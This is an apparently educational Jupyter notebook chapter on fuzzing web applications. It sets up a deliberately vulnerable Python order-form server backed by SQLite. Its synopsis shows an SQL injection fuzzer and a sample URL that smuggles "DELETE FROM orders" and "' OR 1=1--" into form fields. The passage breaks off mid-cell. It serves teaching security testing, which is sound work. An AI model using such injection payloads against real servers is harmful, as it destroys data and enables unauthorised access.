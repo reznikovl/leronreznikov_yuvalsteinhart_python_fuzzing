{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {
    "button": false,
    "new_sheet": false,
    "run_control": {
     "read_only": false
    },
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "# Testing Web Applications\n",
    "\n",
    "In this chapter, we explore how to generate tests for Graphical User Interfaces (GUIs), notably on Web interfaces.  We set up a (vulnerable) Web server and demonstrate how to systematically explore its behavior – first with hand-written grammars, then with grammars automatically inferred from the user interface.  We also show how to conduct systematic attacks on these servers, notably with code and SQL injection."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "button": false,
    "new_sheet": false,
    "run_control": {
     "read_only": false
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "**Prerequisites**\n",
    "\n",
    "* The techniques in this chapter make use of [grammars for fuzzing](Grammars.ipynb).\n",
    "* Basic knowledge of HTML and HTTP is required.\n",
    "* Knowledge of SQL databases is helpful."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "## Synopsis\n",
    "<!-- Automatically generated. Do not edit. -->\n",
    "\n",
    "To [use the code provided in this chapter](Importing.ipynb), write\n",
    "\n",
    "```python\n",
    ">>> from fuzzingbook.WebFuzzer import <identifier>\n",
    "```\n",
    "\n",
    "and then make use of the following features.\n",
    "\n",
    "\n",
    "This chapter provides a simple (and vulnerable) Web server and two experimental fuzzers that are applied to it.\n",
    "\n",
    "### Fuzzing Web Forms\n",
    "\n",
    "`WebFormFuzzer` demonstrates how to interact with a Web form.  Given a URL with a Web form, it automatically extracts a grammar that produces a URL; this URL contains values for all form elements.  Support is limited to GET forms and a subset of HTML form elements.\n",
    "\n",
    "Here's the grammar extracted for our vulnerable Web server:\n",
    "\n",
    "```python\n",
    ">>> web_form_fuzzer = WebFormFuzzer(httpd_url)\n",
    ">>> web_form_fuzzer.grammar['<start>']\n",
    "['<action>?<query>']\n",
    ">>> web_form_fuzzer.grammar['<action>']\n",
    "['/order']\n",
    ">>> web_form_fuzzer.grammar['<query>']\n",
    "['<item>&<name>&<email-1>&<city>&<zip>&<terms>&<submit-1>']\n",
    "```\n",
    "Using it for fuzzing yields a path with all form values filled; accessing this path acts like filling out and submitting the form.\n",
    "\n",
    "```python\n",
    ">>> web_form_fuzzer.fuzz()\n",
    "'/order?item=lockset&name=%43+&email=+c%40_+c&city=%37b_4&zip=5&terms=on&submit='\n",
    "```\n",
    "Repeated calls to `WebFormFuzzer.fuzz()` invoke the form again and again, each time with different (fuzzed) values.\n",
    "\n",
    "### SQL Injection Attacks\n",
    "\n",
    "`SQLInjectionFuzzer` is an experimental extension of `WebFormFuzzer` whose constructor takes an additional _payload_ – an SQL command to be injected and executed on the server.  Otherwise, it is used like `WebFormFuzzer`:\n",
    "\n",
    "```python\n",
    ">>> sql_fuzzer = SQLInjectionFuzzer(httpd_url, \"DELETE FROM orders\")\n",
    ">>> sql_fuzzer.fuzz()\n",
    "\"/order?item=lockset&name=+&email=0%404&city=+'+)%3b+DELETE+FROM+orders%3b+--&zip='+OR+1%3d1--'&terms=on&submit=\"\n",
    "```\n",
    "As you can see, the path to be retrieved contains the payload encoded into one of the form field values.\n",
    "\n",
    "`SQLInjectionFuzzer` is a proof-of-concept on how to build a malicious fuzzer; you should study and extend its code to make actual use of it.\n",
    "\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "button": false,
    "new_sheet": false,
    "run_control": {
     "read_only": false
    },
    "slideshow": {
     "slide_type": "subslide"
    },
    "toc-hr-collapsed": false
   },
   "source": [
    "## A Web User Interface\n",
    "\n",
    "Let us start with a simple example.  We want to set up a _Web server_ that allows readers of this book to buy fuzzingbook-branded fan articles.  In reality, we would make use of an existing Web shop (or an appropriate framework) for this purpose.  For the purpose of this book, we _write our own Web server_, building on the HTTP server facilities provided by the Python library."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "All of our Web server is defined in a `HTTPRequestHandler`, which, as the name suggests, handles arbitrary Web page requests."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:30.525212Z",
     "iopub.status.busy": "2021-12-13T14:45:30.524469Z",
     "iopub.status.idle": "2021-12-13T14:45:30.526948Z",
     "shell.execute_reply": "2021-12-13T14:45:30.527338Z"
    },
    "slideshow": {
     "slide_type": "skip"
    }
   },
   "outputs": [],
   "source": [
    "from http.server import HTTPServer, BaseHTTPRequestHandler\n",
    "from http.server import HTTPStatus  # type: ignore"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:30.530799Z",
     "iopub.status.busy": "2021-12-13T14:45:30.530161Z",
     "iopub.status.idle": "2021-12-13T14:45:30.532461Z",
     "shell.execute_reply": "2021-12-13T14:45:30.532954Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [],
   "source": [
    "class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):\n",
    "    pass"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "### Taking Orders\n",
    "\n",
    "For our Web server, we need a number of Web pages:\n",
    "* We want one page where customers can place an order.\n",
    "* We want one page where they see their order confirmed.  \n",
    "* Additionally, we need pages display error messages such as \"Page Not Found\"."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "We start with the order form.  The dictionary `FUZZINGBOOK_SWAG` holds the items that customers can order, together with long descriptions:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {
    "button": false,
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:30.536568Z",
     "iopub.status.busy": "2021-12-13T14:45:30.535992Z",
     "iopub.status.idle": "2021-12-13T14:45:30.651722Z",
     "shell.execute_reply": "2021-12-13T14:45:30.652357Z"
    },
    "new_sheet": false,
    "run_control": {
     "read_only": false
    },
    "slideshow": {
     "slide_type": "skip"
    }
   },
   "outputs": [],
   "source": [
    "import bookutils"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:30.657101Z",
     "iopub.status.busy": "2021-12-13T14:45:30.656265Z",
     "iopub.status.idle": "2021-12-13T14:45:30.658159Z",
     "shell.execute_reply": "2021-12-13T14:45:30.658540Z"
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [],
   "source": [
    "FUZZINGBOOK_SWAG = {\n",
    "    \"tshirt\": \"One FuzzingBook T-Shirt\",\n",
    "    \"drill\": \"One FuzzingBook Rotary Hammer\",\n",
    "    \"lockset\": \"One FuzzingBook Lock Set\"\n",
    "}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "This is the HTML code for the order form.  The menu for selecting the swag to be ordered is created dynamically from `FUZZINGBOOK_SWAG`.  We omit plenty of details such as precise shipping address, payment, shopping cart, and more."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {
    "button": false,
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:30.663715Z",
     "iopub.status.busy": "2021-12-13T14:45:30.663181Z",
     "iopub.status.idle": "2021-12-13T14:45:30.665149Z",
     "shell.execute_reply": "2021-12-13T14:45:30.665569Z"
    },
    "new_sheet": false,
    "run_control": {
     "read_only": false
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [],
   "source": [
    "HTML_ORDER_FORM = \"\"\"\n",
    "<html><body>\n",
    "<form action=\"/order\" style=\"border:3px; border-style:solid; border-color:#FF0000; padding: 1em;\">\n",
    "  <strong id=\"title\" style=\"font-size: x-large\">Fuzzingbook Swag Order Form</strong>\n",
    "  <p>\n",
    "  Yes! Please send me at your earliest convenience\n",
    "  <select name=\"item\">\n",
    "  \"\"\"\n",
    "# (We don't use h2, h3, etc. here as they interfere with the notebook table of contents)\n",
    "\n",
    "\n",
    "for item in FUZZINGBOOK_SWAG:\n",
    "    HTML_ORDER_FORM += \\\n",
    "        '<option value=\"{item}\">{name}</option>\\n'.format(item=item,\n",
    "            name=FUZZINGBOOK_SWAG[item])\n",
    "\n",
    "HTML_ORDER_FORM += \"\"\"\n",
    "  </select>\n",
    "  <br>\n",
    "  <table>\n",
    "  <tr><td>\n",
    "  <label for=\"name\">Name: </label><input type=\"text\" name=\"name\">\n",
    "  </td><td>\n",
    "  <label for=\"email\">Email: </label><input type=\"email\" name=\"email\"><br>\n",
    "  </td></tr>\n",
    "  <tr><td>\n",
    "  <label for=\"city\">City: </label><input type=\"text\" name=\"city\">\n",
    "  </td><td>\n",
    "  <label for=\"zip\">ZIP Code: </label><input type=\"number\" name=\"zip\">\n",
    "  </tr></tr>\n",
    "  </table>\n",
    "  <input type=\"checkbox\" name=\"terms\"><label for=\"terms\">I have read\n",
    "  the <a href=\"/terms\">terms and conditions</a></label>.<br>\n",
    "  <input type=\"submit\" name=\"submit\" value=\"Place order\">\n",
    "</p>\n",
    "</form>\n",
    "</body></html>\n",
    "\"\"\""
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "This is what the order form looks like:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:30.669520Z",
     "iopub.status.busy": "2021-12-13T14:45:30.668934Z",
     "iopub.status.idle": "2021-12-13T14:45:30.670652Z",
     "shell.execute_reply": "2021-12-13T14:45:30.671083Z"
    },
    "slideshow": {
     "slide_type": "skip"
    }
   },
   "outputs": [],
   "source": [
    "from IPython.display import display"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:30.673982Z",
     "iopub.status.busy": "2021-12-13T14:45:30.673471Z",
     "iopub.status.idle": "2021-12-13T14:45:30.675117Z",
     "shell.execute_reply": "2021-12-13T14:45:30.675488Z"
    },
    "slideshow": {
     "slide_type": "skip"
    }
   },
   "outputs": [],
   "source": [
    "from bookutils import HTML"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:30.683768Z",
     "iopub.status.busy": "2021-12-13T14:45:30.683165Z",
     "iopub.status.idle": "2021-12-13T14:45:30.688023Z",
     "shell.execute_reply": "2021-12-13T14:45:30.688403Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "\n",
       "<html><body>\n",
       "<form action=\"/order\" style=\"border:3px; border-style:solid; border-color:#FF0000; padding: 1em;\">\n",
       "  <strong id=\"title\" style=\"font-size: x-large\">Fuzzingbook Swag Order Form</strong>\n",
       "  <p>\n",
       "  Yes! Please send me at your earliest convenience\n",
       "  <select name=\"item\">\n",
       "  <option value=\"tshirt\">One FuzzingBook T-Shirt</option>\n",
       "<option value=\"drill\">One FuzzingBook Rotary Hammer</option>\n",
       "<option value=\"lockset\">One FuzzingBook Lock Set</option>\n",
       "\n",
       "  </select>\n",
       "  <br>\n",
       "  <table>\n",
       "  <tr><td>\n",
       "  <label for=\"name\">Name: </label><input type=\"text\" name=\"name\">\n",
       "  </td><td>\n",
       "  <label for=\"email\">Email: </label><input type=\"email\" name=\"email\"><br>\n",
       "  </td></tr>\n",
       "  <tr><td>\n",
       "  <label for=\"city\">City: </label><input type=\"text\" name=\"city\">\n",
       "  </td><td>\n",
       "  <label for=\"zip\">ZIP Code: </label><input type=\"number\" name=\"zip\">\n",
       "  </tr></tr>\n",
       "  </table>\n",
       "  <input type=\"checkbox\" name=\"terms\"><label for=\"terms\">I have read\n",
       "  the <a href=\"/terms\">terms and conditions</a></label>.<br>\n",
       "  <input type=\"submit\" name=\"submit\" value=\"Place order\">\n",
       "</p>\n",
       "</form>\n",
       "</body></html>\n"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "execution_count": 8,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "HTML(HTML_ORDER_FORM)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "This form is not yet functional, as there is no server behind it; pressing \"place order\" will lead you to a nonexistent page."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    },
    "toc-hr-collapsed": false
   },
   "source": [
    "### Order Confirmation\n",
    "\n",
    "Once we have gotten an order, we show a confirmation page, which is instantiated with the customer information submitted before.  Here is the HTML and the rendering:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {
    "button": false,
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:30.692241Z",
     "iopub.status.busy": "2021-12-13T14:45:30.691655Z",
     "iopub.status.idle": "2021-12-13T14:45:30.693341Z",
     "shell.execute_reply": "2021-12-13T14:45:30.693710Z"
    },
    "new_sheet": false,
    "run_control": {
     "read_only": false
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [],
   "source": [
    "HTML_ORDER_RECEIVED = \"\"\"\n",
    "<html><body>\n",
    "<div style=\"border:3px; border-style:solid; border-color:#FF0000; padding: 1em;\">\n",
    "  <strong id=\"title\" style=\"font-size: x-large\">Thank you for your Fuzzingbook Order!</strong>\n",
    "  <p id=\"confirmation\">\n",
    "  We will send <strong>{item_name}</strong> to {name} in {city}, {zip}<br>\n",
    "  A confirmation mail will be sent to {email}.\n",
    "  </p>\n",
    "  <p>\n",
    "  Want more swag?  Use our <a href=\"/\">order form</a>!\n",
    "  </p>\n",
    "</div>\n",
    "</body></html>\n",
    "\"\"\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:30.697592Z",
     "iopub.status.busy": "2021-12-13T14:45:30.697032Z",
     "iopub.status.idle": "2021-12-13T14:45:30.699503Z",
     "shell.execute_reply": "2021-12-13T14:45:30.699875Z"
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "\n",
       "<html><body>\n",
       "<div style=\"border:3px; border-style:solid; border-color:#FF0000; padding: 1em;\">\n",
       "  <strong id=\"title\" style=\"font-size: x-large\">Thank you for your Fuzzingbook Order!</strong>\n",
       "  <p id=\"confirmation\">\n",
       "  We will send <strong>One FuzzingBook Rotary Hammer</strong> to Jane Doe in Seattle, 98104<br>\n",
       "  A confirmation mail will be sent to doe@example.com.\n",
       "  </p>\n",
       "  <p>\n",
       "  Want more swag?  Use our <a href=\"/\">order form</a>!\n",
       "  </p>\n",
       "</div>\n",
       "</body></html>\n"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "execution_count": 10,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "HTML(HTML_ORDER_RECEIVED.format(item_name=\"One FuzzingBook Rotary Hammer\",\n",
    "                                name=\"Jane Doe\",\n",
    "                                email=\"doe@example.com\",\n",
    "                                city=\"Seattle\",\n",
    "                                zip=\"98104\"))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "### Terms and Conditions\n",
    "\n",
    "A Web site can only be complete if it has the necessary legalese.  This page shows some terms and conditions."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {
    "button": false,
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:30.703923Z",
     "iopub.status.busy": "2021-12-13T14:45:30.703236Z",
     "iopub.status.idle": "2021-12-13T14:45:30.704727Z",
     "shell.execute_reply": "2021-12-13T14:45:30.705330Z"
    },
    "new_sheet": false,
    "run_control": {
     "read_only": false
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [],
   "source": [
    "HTML_TERMS_AND_CONDITIONS = \"\"\"\n",
    "<html><body>\n",
    "<div style=\"border:3px; border-style:solid; border-color:#FF0000; padding: 1em;\">\n",
    "  <strong id=\"title\" style=\"font-size: x-large\">Fuzzingbook Terms and Conditions</strong>\n",
    "  <p>\n",
    "  The content of this project is licensed under the\n",
    "  <a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/\">Creative Commons\n",
    "  Attribution-NonCommercial-ShareAlike 4.0 International License.</a>\n",
    "  </p>\n",
    "  <p>\n",
    "  To place an order, use our <a href=\"/\">order form</a>.\n",
    "  </p>\n",
    "</div>\n",
    "</body></html>\n",
    "\"\"\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:30.709380Z",
     "iopub.status.busy": "2021-12-13T14:45:30.708806Z",
     "iopub.status.idle": "2021-12-13T14:45:30.711676Z",
     "shell.execute_reply": "2021-12-13T14:45:30.712172Z"
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "\n",
       "<html><body>\n",
       "<div style=\"border:3px; border-style:solid; border-color:#FF0000; padding: 1em;\">\n",
       "  <strong id=\"title\" style=\"font-size: x-large\">Fuzzingbook Terms and Conditions</strong>\n",
       "  <p>\n",
       "  The content of this project is licensed under the\n",
       "  <a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/\">Creative Commons\n",
       "  Attribution-NonCommercial-ShareAlike 4.0 International License.</a>\n",
       "  </p>\n",
       "  <p>\n",
       "  To place an order, use our <a href=\"/\">order form</a>.\n",
       "  </p>\n",
       "</div>\n",
       "</body></html>\n"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "execution_count": 12,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "HTML(HTML_TERMS_AND_CONDITIONS)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "## Storing Orders"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "To store orders, we make use of a *database*, stored in the file `orders.db`."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:30.715967Z",
     "iopub.status.busy": "2021-12-13T14:45:30.715123Z",
     "iopub.status.idle": "2021-12-13T14:45:30.716970Z",
     "shell.execute_reply": "2021-12-13T14:45:30.717418Z"
    },
    "slideshow": {
     "slide_type": "skip"
    }
   },
   "outputs": [],
   "source": [
    "import sqlite3\n",
    "import os"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:30.720446Z",
     "iopub.status.busy": "2021-12-13T14:45:30.719866Z",
     "iopub.status.idle": "2021-12-13T14:45:30.721446Z",
     "shell.execute_reply": "2021-12-13T14:45:30.721910Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [],
   "source": [
    "ORDERS_DB = \"orders.db\""
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "To interact with the database, we use *SQL commands*.  The following commands create a table with five text columns for item, name, email, city, and zip – the exact same fields we also use in our HTML form."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:30.726126Z",
     "iopub.status.busy": "2021-12-13T14:45:30.725603Z",
     "iopub.status.idle": "2021-12-13T14:45:30.727134Z",
     "shell.execute_reply": "2021-12-13T14:45:30.727507Z"
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [],
   "source": [
    "def init_db():\n",
    "    if os.path.exists(ORDERS_DB):\n",
    "        os.remove(ORDERS_DB)\n",
    "\n",
    "    db_connection = sqlite3.connect(ORDERS_DB)\n",
    "    db_connection.execute(\"DROP TABLE IF EXISTS orders\")\n",
    "    db_connection.execute(\"CREATE TABLE orders (item text, name text, email text, city text, zip text)\")\n",
    "    db_connection.commit()\n",
    "\n",
    "    return db_connection"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:30.730397Z",
     "iopub.status.busy": "2021-12-13T14:45:30.729880Z",
     "iopub.status.idle": "2021-12-13T14:45:30.733376Z",
     "shell.execute_reply": "2021-12-13T14:45:30.733774Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [],
   "source": [
    "db = init_db()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "At this point, the database is still empty:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:30.737403Z",
     "iopub.status.busy": "2021-12-13T14:45:30.736841Z",
     "iopub.status.idle": "2021-12-13T14:45:30.739201Z",
     "shell.execute_reply": "2021-12-13T14:45:30.739603Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[]\n"
     ]
    }
   ],
   "source": [
    "print(db.execute(\"SELECT * FROM orders\").fetchall())"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "We can add entries using the SQL `INSERT` command:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:30.742799Z",
     "iopub.status.busy": "2021-12-13T14:45:30.742282Z",
     "iopub.status.idle": "2021-12-13T14:45:30.744713Z",
     "shell.execute_reply": "2021-12-13T14:45:30.745176Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [],
   "source": [
    "db.execute(\"INSERT INTO orders \" +\n",
    "           \"VALUES ('lockset', 'Walter White', 'white@jpwynne.edu', 'Albuquerque', '87101')\")\n",
    "db.commit()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "These values are now in the database:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:30.748808Z",
     "iopub.status.busy": "2021-12-13T14:45:30.748256Z",
     "iopub.status.idle": "2021-12-13T14:45:30.750384Z",
     "shell.execute_reply": "2021-12-13T14:45:30.750976Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[('lockset', 'Walter White', 'white@jpwynne.edu', 'Albuquerque', '87101')]\n"
     ]
    }
   ],
   "source": [
    "print(db.execute(\"SELECT * FROM orders\").fetchall())"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "We can also delete entries from the table again (say, after completion of the order):"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:30.754613Z",
     "iopub.status.busy": "2021-12-13T14:45:30.753948Z",
     "iopub.status.idle": "2021-12-13T14:45:30.756641Z",
     "shell.execute_reply": "2021-12-13T14:45:30.757180Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [],
   "source": [
    "db.execute(\"DELETE FROM orders WHERE name = 'Walter White'\")\n",
    "db.commit()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:30.760529Z",
     "iopub.status.busy": "2021-12-13T14:45:30.759975Z",
     "iopub.status.idle": "2021-12-13T14:45:30.762068Z",
     "shell.execute_reply": "2021-12-13T14:45:30.762437Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[]\n"
     ]
    }
   ],
   "source": [
    "print(db.execute(\"SELECT * FROM orders\").fetchall())"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "### Handling HTTP Requests\n",
    "\n",
    "We have an order form and a database; now we need a Web server which brings it all together.  The Python `http.server` module provides everything we need to build a simple HTTP server.  A `HTTPRequestHandler` is an object that takes and processes HTTP requests – in particular, `GET` requests for retrieving Web pages."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "We implement the `do_GET()` method that, based on the given path, branches off to serve the requested Web pages.  Requesting the path `/` produces the order form; a path beginning with `/order` sends an order to be processed.  All other requests end in a `Page Not Found` message."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:30.767114Z",
     "iopub.status.busy": "2021-12-13T14:45:30.766392Z",
     "iopub.status.idle": "2021-12-13T14:45:30.768264Z",
     "shell.execute_reply": "2021-12-13T14:45:30.768714Z"
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [],
   "source": [
    "class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):\n",
    "    def do_GET(self):\n",
    "        try:\n",
    "            # print(\"GET \" + self.path)\n",
    "            if self.path == \"/\":\n",
    "                self.send_order_form()\n",
    "            elif self.path.startswith(\"/order\"):\n",
    "                self.handle_order()\n",
    "            elif self.path.startswith(\"/terms\"):\n",
    "                self.send_terms_and_conditions()\n",
    "            else:\n",
    "                self.not_found()\n",
    "        except Exception:\n",
    "            self.internal_server_error()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "#### Order Form\n",
    "\n",
    "Accessing the home page (i.e. getting the page at `/`) is simple: We go and serve the `html_order_form` as defined above."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:30.772666Z",
     "iopub.status.busy": "2021-12-13T14:45:30.772092Z",
     "iopub.status.idle": "2021-12-13T14:45:30.773673Z",
     "shell.execute_reply": "2021-12-13T14:45:30.774109Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [],
   "source": [
    "class SimpleHTTPRequestHandler(SimpleHTTPRequestHandler):\n",
    "    def send_order_form(self):\n",
    "        self.send_response(HTTPStatus.OK, \"Place your order\")\n",
    "        self.send_header(\"Content-type\", \"text/html\")\n",
    "        self.end_headers()\n",
    "        self.wfile.write(HTML_ORDER_FORM.encode(\"utf8\"))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "Likewise, we can send out the terms and conditions:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:30.778222Z",
     "iopub.status.busy": "2021-12-13T14:45:30.777604Z",
     "iopub.status.idle": "2021-12-13T14:45:30.779302Z",
     "shell.execute_reply": "2021-12-13T14:45:30.779997Z"
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [],
   "source": [
    "class SimpleHTTPRequestHandler(SimpleHTTPRequestHandler):\n",
    "    def send_terms_and_conditions(self):\n",
    "        self.send_response(HTTPStatus.OK, \"Terms and Conditions\")\n",
    "        self.send_header(\"Content-type\", \"text/html\")\n",
    "        self.end_headers()\n",
    "        self.wfile.write(HTML_TERMS_AND_CONDITIONS.encode(\"utf8\"))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "#### Processing Orders"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "When the user clicks `Submit` on the order form, the Web browser creates and retrieves a URL of the form\n",
    "\n",
    "```\n",
    "<hostname>/order?field_1=value_1&field_2=value_2&field_3=value_3\n",
    "```\n",
    "\n",
    "where each `field_i` is the name of the field in the HTML form, and `value_i` is the value provided by the user.  Values use the CGI encoding we have seen in the [chapter on coverage](Coverage.ipynb) – that is, spaces are converted into `+`, and characters that are not digits or letters are converted into `%nn`, where `nn` is the hexadecimal value of the character.\n",
    "\n",
    "If Jane Doe <doe@example.com> from Seattle orders a T-Shirt, this is the URL the browser creates:\n",
    "\n",
    "```\n",
    "<hostname>/order?item=tshirt&name=Jane+Doe&email=doe%40example.com&city=Seattle&zip=98104\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "When processing a query, the attribute `self.path` of the HTTP request handler holds the path accessed – i.e., everything after `<hostname>`.  The helper method `get_field_values()` takes `self.path` and returns a dictionary of values."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:30.783392Z",
     "iopub.status.busy": "2021-12-13T14:45:30.782854Z",
